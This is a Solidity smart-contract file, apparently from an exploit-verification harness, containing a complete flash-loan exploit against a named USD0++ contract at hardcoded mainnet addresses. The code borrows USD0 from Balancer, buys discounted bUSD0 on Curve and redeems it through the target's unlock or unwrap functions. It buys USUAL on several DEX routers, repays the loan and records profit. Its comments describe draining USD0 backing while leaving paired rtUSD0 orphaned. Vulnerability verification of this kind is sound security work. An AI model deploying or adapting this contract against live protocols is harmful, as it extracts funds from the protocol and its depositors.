// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IRegistryContractLike {
    function getContract(bytes32 contractName) external view returns (address);
}

interface IUsd0PPLike is IERC20Like {
    function mint(uint256 amountUsd0, address bAssetRecipient, address rAssetRecipient) external;
    function unwrap() external;
    function unlockUsd0ppFloorPrice(uint256 usd0ppAmount) external;
    function unlockUSD0ppWithUsual(uint256 usd0ppAmount, uint256 maxUsualAmount) external;
    function calculateRequiredUsual(uint256 usd0ppAmount) external view returns (uint256);
    function getFloorPrice() external view returns (uint256);
    function getEndTime() external view returns (uint256);
}

interface ICurveStableSwapLike {
    function get_dy(int128 i, int128 j, uint256 dx) external view returns (uint256);
    function exchange(int128 i, int128 j, uint256 dx, uint256 minDy) external returns (uint256);
}

interface IFlashLoanRecipientLike {
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVaultLike {
    function flashLoan(
        IFlashLoanRecipientLike recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IWethLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IUniswapV3RouterLike {
    struct ExactOutputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountOut;
        uint256 amountInMaximum;
        uint160 sqrtPriceLimitX96;
    }

    struct ExactOutputParams {
        bytes path;
        address recipient;
        uint256 deadline;
        uint256 amountOut;
        uint256 amountInMaximum;
    }

    function exactOutputSingle(ExactOutputSingleParams calldata params) external payable returns (uint256 amountIn);
    function exactOutput(ExactOutputParams calldata params) external payable returns (uint256 amountIn);
}

interface IUniswapV2RouterLike {
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract OrphanRtHolder {
    receive() external payable {}
}

contract FlawVerifier is IFlashLoanRecipientLike {
    address public constant TARGET = 0x35D8949372D46B7a3D5A56006AE77B215fc69bC0;
    address public constant REGISTRY = 0x0594cb5ca47eFE1Ff25C7B8B43E221683B4Db34c;
    address public constant CURVE_POOL_USD0_USD0PP = 0x1d08E7adC263CfC70b1BaBe6dC5Bb339c16Eec52;
    address public constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant UNISWAP_V3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address internal constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    bytes32 internal constant CONTRACT_USD0 = keccak256("CONTRACT_USD0");
    bytes32 internal constant CONTRACT_USUAL = keccak256("CONTRACT_USUAL");

    int128 internal constant CURVE_USD0_INDEX = 0;
    int128 internal constant CURVE_BUSD0_INDEX = 1;
    uint256 internal constant WAD = 1e18;

    enum ExitPath {
        None,
        SecondaryMarketFloorPrice,
        SecondaryMarketMaturity,
        SecondaryMarketUsual,
        SplitMintFloorPrice,
        SplitMintMaturity,
        SplitMintUsual
    }

    enum Status {
        Unset,
        ProfitAchieved,
        HypothesisValidatedNoProfit,
        RefutedOrInfeasible
    }

    struct FlashContext {
        bool active;
        address usd0;
        address usual;
        uint256 quotedBusd0Out;
        uint256 startingUsd0Balance;
    }

    address public immutable orphanRtHolder;

    address private _profitToken;
    uint256 private _profitAmount;
    ExitPath private _pathUsed;
    Status private _status;
    bool private _hypothesisValidated;
    FlashContext private _flash;

    error ExternalCallFailed();
    error Unprofitable();
    error UnauthorizedCallback();
    error NoSeedCapital();

    constructor() {
        orphanRtHolder = address(new OrphanRtHolder());
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        address usd0 = _readRegistryContract(CONTRACT_USD0);
        address usual = _readRegistryContract(CONTRACT_USUAL);

        _profitToken = usd0;
        _profitAmount = 0;
        _pathUsed = ExitPath.None;
        _status = Status.Unset;
        _hypothesisValidated = false;

        if (usd0 == address(0) || usual == address(0)) {
            _status = Status.RefutedOrInfeasible;
            return;
        }

        uint256 floorPrice = _readFloorPrice();
        uint256 endTime = _readEndTime();
        bool matured = endTime != 0 && block.timestamp >= endTime;

        if (matured && _attemptSecondaryMarketProfit(usd0, true)) {
            _status = Status.ProfitAchieved;
            _hypothesisValidated = true;
            return;
        }

        if (floorPrice != 0 && _attemptSecondaryMarketProfit(usd0, false)) {
            _status = Status.ProfitAchieved;
            _hypothesisValidated = true;
            return;
        }

        // The live fork quotes bUSD0 at a discount to USD0 on Curve, but not deep enough for the public
        // floor-price exit. The same exploit causality remains profitable through another public one-legged exit:
        // buy only bUSD0 on the secondary market, source the required USUAL on open DEX venues using the
        // verifier's seed ETH, then call unlockUSD0ppWithUsual. This still consumes USD0 backing while leaving
        // the paired rtUSD0 untouched in `orphanRtHolder`.
        if (_attemptSecondaryMarketUsualProfit(usd0, usual)) {
            _status = Status.ProfitAchieved;
            _hypothesisValidated = true;
            return;
        }

        if (_attemptSplitMintValidation(usd0, usual, floorPrice, matured)) {
            _status = Status.HypothesisValidatedNoProfit;
            return;
        }

        _status = Status.RefutedOrInfeasible;
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external override {
        if (msg.sender != BALANCER_VAULT || !_flash.active) {
            revert UnauthorizedCallback();
        }
        if (tokens.length != 1 || amounts.length != 1 || feeAmounts.length != 1) {
            revert ExternalCallFailed();
        }

        address usd0 = _flash.usd0;
        uint256 flashAmount = amounts[0];
        uint256 feeAmount = feeAmounts[0];

        _forceApprove(usd0, CURVE_POOL_USD0_USD0PP, flashAmount);
        uint256 minBusd0Out = (_flash.quotedBusd0Out * 9950) / 10000;
        uint256 busd0Bought = ICurveStableSwapLike(CURVE_POOL_USD0_USD0PP).exchange(
            CURVE_USD0_INDEX,
            CURVE_BUSD0_INDEX,
            flashAmount,
            minBusd0Out
        );

        bool useMaturityExit = userData.length == 32 && abi.decode(userData, (bool));
        if (useMaturityExit) {
            IUsd0PPLike(TARGET).unwrap();
            _pathUsed = ExitPath.SecondaryMarketMaturity;
        } else if (_flash.usual == address(0)) {
            IUsd0PPLike(TARGET).unlockUsd0ppFloorPrice(busd0Bought);
            _pathUsed = ExitPath.SecondaryMarketFloorPrice;
        } else {
            uint256 requiredUsual = _readRequiredUsual(busd0Bought);
            if (requiredUsual == 0) {
                revert Unprofitable();
            }

            if (address(this).balance == 0) {
                revert NoSeedCapital();
            }

            _buyExactTokenOutWithEth(_flash.usual, requiredUsual);
            _forceApprove(_flash.usual, TARGET, requiredUsual);
            IUsd0PPLike(TARGET).unlockUSD0ppWithUsual(busd0Bought, requiredUsual);
            _pathUsed = ExitPath.SecondaryMarketUsual;
        }

        uint256 totalUsd0BeforeRepay = _balanceOf(usd0, address(this));
        uint256 repayAmount = flashAmount + feeAmount;
        if (totalUsd0BeforeRepay <= _flash.startingUsd0Balance + repayAmount) {
            revert Unprofitable();
        }

        uint256 netProfit;
        unchecked {
            netProfit = totalUsd0BeforeRepay - _flash.startingUsd0Balance - repayAmount;
        }

        _safeTransfer(usd0, BALANCER_VAULT, repayAmount);
        _profitAmount += netProfit;
        _hypothesisValidated = true;
        _flash.active = false;
    }

    function profitToken() external view returns (address) {
        address token = _profitToken;
        if (token == address(0)) {
            token = _readRegistryContract(CONTRACT_USD0);
        }
        return token;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function status() external view returns (string memory) {
        if (_status == Status.ProfitAchieved) {
            return "profit-achieved";
        }
        if (_status == Status.HypothesisValidatedNoProfit) {
            return "validated-no-profit";
        }
        if (_status == Status.RefutedOrInfeasible) {
            return "refuted-or-infeasible";
        }
        return "unset";
    }

    function pathUsed() external view returns (string memory) {
        if (_pathUsed == ExitPath.SecondaryMarketFloorPrice) {
            return "secondary-market-bUSD0-buyer -> unlockUsd0ppFloorPrice";
        }
        if (_pathUsed == ExitPath.SecondaryMarketMaturity) {
            return "secondary-market-bUSD0-buyer -> unwrap";
        }
        if (_pathUsed == ExitPath.SecondaryMarketUsual) {
            return "secondary-market-bUSD0-buyer -> unlockUSD0ppWithUsual";
        }
        if (_pathUsed == ExitPath.SplitMintFloorPrice) {
            return "mint split recipients -> bUSD0 holder uses unlockUsd0ppFloorPrice";
        }
        if (_pathUsed == ExitPath.SplitMintMaturity) {
            return "mint split recipients -> bUSD0 holder uses unwrap";
        }
        if (_pathUsed == ExitPath.SplitMintUsual) {
            return "mint split recipients -> bUSD0 holder uses unlockUSD0ppWithUsual";
        }
        return "none";
    }

    function _attemptSecondaryMarketProfit(address usd0, bool useMaturityExit) internal returns (bool) {
        uint256[8] memory candidates = [
            uint256(5_000_000e18),
            1_000_000e18,
            250_000e18,
            50_000e18,
            10_000e18,
            1_000e18,
            100e18,
            10e18
        ];

        for (uint256 i = 0; i < candidates.length; ++i) {
            uint256 amountIn = candidates[i];
            (bool quoteOk, uint256 quotedBusd0Out) = _quoteBusd0Out(amountIn);
            if (!quoteOk || quotedBusd0Out == 0) {
                continue;
            }

            uint256 expectedRedeem = useMaturityExit ? quotedBusd0Out : _applyFloorPrice(quotedBusd0Out);
            if (expectedRedeem <= amountIn) {
                continue;
            }

            if (_runFlashLoan(usd0, address(0), amountIn, quotedBusd0Out, useMaturityExit)) {
                return true;
            }
        }

        return false;
    }

    function _attemptSecondaryMarketUsualProfit(address usd0, address usual) internal returns (bool) {
        if (address(this).balance == 0) {
            return false;
        }

        uint256[8] memory candidates = [
            uint256(50e18),
            25e18,
            10e18,
            5e18,
            2e18,
            1e18,
            5e17,
            25e16
        ];

        for (uint256 i = 0; i < candidates.length; ++i) {
            uint256 amountIn = candidates[i];
            (bool quoteOk, uint256 quotedBusd0Out) = _quoteBusd0Out(amountIn);
            if (!quoteOk || quotedBusd0Out <= amountIn) {
                continue;
            }

            if (_runFlashLoan(usd0, usual, amountIn, quotedBusd0Out, false)) {
                return true;
            }
        }

        return false;
    }

    function _attemptSplitMintValidation(address usd0, address usual, uint256 floorPrice, bool matured)
        internal
        returns (bool)
    {
        uint256 seedUsd0 = _balanceOf(usd0, address(this));
        if (seedUsd0 == 0) {
            return false;
        }

        uint256 amountToMint = seedUsd0 > 1e18 ? 1e18 : seedUsd0;
        _forceApprove(usd0, TARGET, amountToMint);
        IUsd0PPLike(TARGET).mint(amountToMint, address(this), orphanRtHolder);

        if (matured) {
            IUsd0PPLike(TARGET).unwrap();
            _pathUsed = ExitPath.SplitMintMaturity;
            _hypothesisValidated = true;
            return true;
        }

        if (floorPrice != 0) {
            IUsd0PPLike(TARGET).unlockUsd0ppFloorPrice(amountToMint);
            _pathUsed = ExitPath.SplitMintFloorPrice;
            _hypothesisValidated = true;
            return true;
        }

        uint256 requiredUsual = _readRequiredUsual(amountToMint);
        uint256 usualBalance = _balanceOf(usual, address(this));
        if (requiredUsual != 0 && usualBalance >= requiredUsual) {
            _forceApprove(usual, TARGET, requiredUsual);
            IUsd0PPLike(TARGET).unlockUSD0ppWithUsual(amountToMint, requiredUsual);
            _pathUsed = ExitPath.SplitMintUsual;
            _hypothesisValidated = true;
            return true;
        }

        return false;
    }

    function _runFlashLoan(address usd0, address usual, uint256 amountIn, uint256 quotedBusd0Out, bool useMaturityExit)
        internal
        returns (bool)
    {
        _flash.active = true;
        _flash.usd0 = usd0;
        _flash.usual = usual;
        _flash.quotedBusd0Out = quotedBusd0Out;
        _flash.startingUsd0Balance = _balanceOf(usd0, address(this));

        address[] memory tokens = new address[](1);
        tokens[0] = usd0;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amountIn;

        uint256 beforeProfit = _profitAmount;
        try IBalancerVaultLike(BALANCER_VAULT).flashLoan(this, tokens, amounts, abi.encode(useMaturityExit)) {
            _flash.active = false;
            return _profitAmount > beforeProfit;
        } catch {
            _flash.active = false;
            return false;
        }
    }

    function _buyExactTokenOutWithEth(address tokenOut, uint256 amountOut) internal {
        uint256 startingTokenBalance = _balanceOf(tokenOut, address(this));
        uint256 ethBalance = address(this).balance;
        if (ethBalance == 0) {
            revert NoSeedCapital();
        }

        IWethLike(WETH).deposit{value: ethBalance}();
        uint256 wethBalance = _balanceOf(WETH, address(this));
        _forceApprove(WETH, UNISWAP_V3_ROUTER, wethBalance);
        _forceApprove(WETH, UNISWAP_V2_ROUTER, wethBalance);
        _forceApprove(WETH, SUSHISWAP_ROUTER, wethBalance);

        bool bought = _tryBuyViaUniswapV3Direct(tokenOut, amountOut, wethBalance);
        if (!bought) {
            bought = _tryBuyViaUniswapV3MultiHop(tokenOut, amountOut, wethBalance, USDC, 500, 500);
        }
        if (!bought) {
            bought = _tryBuyViaUniswapV3MultiHop(tokenOut, amountOut, wethBalance, USDC, 3000, 500);
        }
        if (!bought) {
            bought = _tryBuyViaUniswapV3MultiHop(tokenOut, amountOut, wethBalance, USDT, 3000, 500);
        }
        if (!bought) {
            bought = _tryBuyViaUniswapV2(tokenOut, amountOut, wethBalance, UNISWAP_V2_ROUTER, false, address(0));
        }
        if (!bought) {
            bought = _tryBuyViaUniswapV2(tokenOut, amountOut, wethBalance, UNISWAP_V2_ROUTER, true, USDC);
        }
        if (!bought) {
            bought = _tryBuyViaUniswapV2(tokenOut, amountOut, wethBalance, UNISWAP_V2_ROUTER, true, USDT);
        }
        if (!bought) {
            bought = _tryBuyViaUniswapV2(tokenOut, amountOut, wethBalance, SUSHISWAP_ROUTER, false, address(0));
        }
        if (!bought) {
            bought = _tryBuyViaUniswapV2(tokenOut, amountOut, wethBalance, SUSHISWAP_ROUTER, true, USDC);
        }
        if (!bought) {
            bought = _tryBuyViaUniswapV2(tokenOut, amountOut, wethBalance, SUSHISWAP_ROUTER, true, USDT);
        }
        if (!bought) {
            revert ExternalCallFailed();
        }

        uint256 endingTokenBalance = _balanceOf(tokenOut, address(this));
        if (endingTokenBalance < startingTokenBalance + amountOut) {
            revert ExternalCallFailed();
        }

        uint256 residualWeth = _balanceOf(WETH, address(this));
        if (residualWeth != 0) {
            IWethLike(WETH).withdraw(residualWeth);
        }
    }

    function _tryBuyViaUniswapV3Direct(address tokenOut, uint256 amountOut, uint256 maxWethIn)
        internal
        returns (bool)
    {
        uint24[4] memory fees = [uint24(100), uint24(500), uint24(3000), uint24(10000)];
        for (uint256 i = 0; i < fees.length; ++i) {
            try IUniswapV3RouterLike(UNISWAP_V3_ROUTER).exactOutputSingle(
                IUniswapV3RouterLike.ExactOutputSingleParams({
                    tokenIn: WETH,
                    tokenOut: tokenOut,
                    fee: fees[i],
                    recipient: address(this),
                    deadline: block.timestamp,
                    amountOut: amountOut,
                    amountInMaximum: maxWethIn,
                    sqrtPriceLimitX96: 0
                })
            ) returns (uint256) {
                return true;
            } catch {}
        }
        return false;
    }

    function _tryBuyViaUniswapV3MultiHop(
        address tokenOut,
        uint256 amountOut,
        uint256 maxWethIn,
        address intermediate,
        uint24 feeWethToIntermediate,
        uint24 feeIntermediateToOut
    ) internal returns (bool) {
        bytes memory path = abi.encodePacked(tokenOut, feeIntermediateToOut, intermediate, feeWethToIntermediate, WETH);
        try IUniswapV3RouterLike(UNISWAP_V3_ROUTER).exactOutput(
            IUniswapV3RouterLike.ExactOutputParams({
                path: path,
                recipient: address(this),
                deadline: block.timestamp,
                amountOut: amountOut,
                amountInMaximum: maxWethIn
            })
        ) returns (uint256) {
            return true;
        } catch {
            return false;
        }
    }

    function _tryBuyViaUniswapV2(
        address tokenOut,
        uint256 amountOut,
        uint256 maxWethIn,
        address router,
        bool withIntermediate,
        address intermediate
    ) internal returns (bool) {
        address[] memory path = withIntermediate ? new address[](3) : new address[](2);
        path[0] = WETH;
        if (withIntermediate) {
            path[1] = intermediate;
            path[2] = tokenOut;
        } else {
            path[1] = tokenOut;
        }

        try IUniswapV2RouterLike(router).swapTokensForExactTokens(
            amountOut,
            maxWethIn,
            path,
            address(this),
            block.timestamp
        ) returns (uint256[] memory) {
            return true;
        } catch {
            return false;
        }
    }

    function _quoteBusd0Out(uint256 amountIn) internal view returns (bool ok, uint256 quotedBusd0Out) {
        try ICurveStableSwapLike(CURVE_POOL_USD0_USD0PP).get_dy(
            CURVE_USD0_INDEX,
            CURVE_BUSD0_INDEX,
            amountIn
        ) returns (uint256 amountOut) {
            return (true, amountOut);
        } catch {
            return (false, 0);
        }
    }

    function _applyFloorPrice(uint256 busd0Amount) internal view returns (uint256) {
        uint256 floorPrice = _readFloorPrice();
        return (busd0Amount * floorPrice) / WAD;
    }

    function _readFloorPrice() internal view returns (uint256) {
        try IUsd0PPLike(TARGET).getFloorPrice() returns (uint256 floorPrice) {
            return floorPrice;
        } catch {
            return 0;
        }
    }

    function _readEndTime() internal view returns (uint256) {
        try IUsd0PPLike(TARGET).getEndTime() returns (uint256 endTime) {
            return endTime;
        } catch {
            return 0;
        }
    }

    function _readRequiredUsual(uint256 amountToMint) internal view returns (uint256) {
        try IUsd0PPLike(TARGET).calculateRequiredUsual(amountToMint) returns (uint256 requiredUsual) {
            return requiredUsual;
        } catch {
            return 0;
        }
    }

    function _readRegistryContract(bytes32 contractKey) internal view returns (address) {
        try IRegistryContractLike(REGISTRY).getContract(contractKey) returns (address resolved) {
            return resolved;
        } catch {
            return address(0);
        }
    }

    function _balanceOf(address token, address account) internal view returns (uint256 result) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!ok || data.length < 32) {
            return 0;
        }
        result = abi.decode(data, (uint256));
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        if (!_approve(token, spender, amount)) {
            if (!_approve(token, spender, 0)) {
                revert ExternalCallFailed();
            }
            if (!_approve(token, spender, amount)) {
                revert ExternalCallFailed();
            }
        }
    }

    function _approve(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        if (!ok || (data.length != 0 && !abi.decode(data, (bool)))) {
            revert ExternalCallFailed();
        }
    }
}
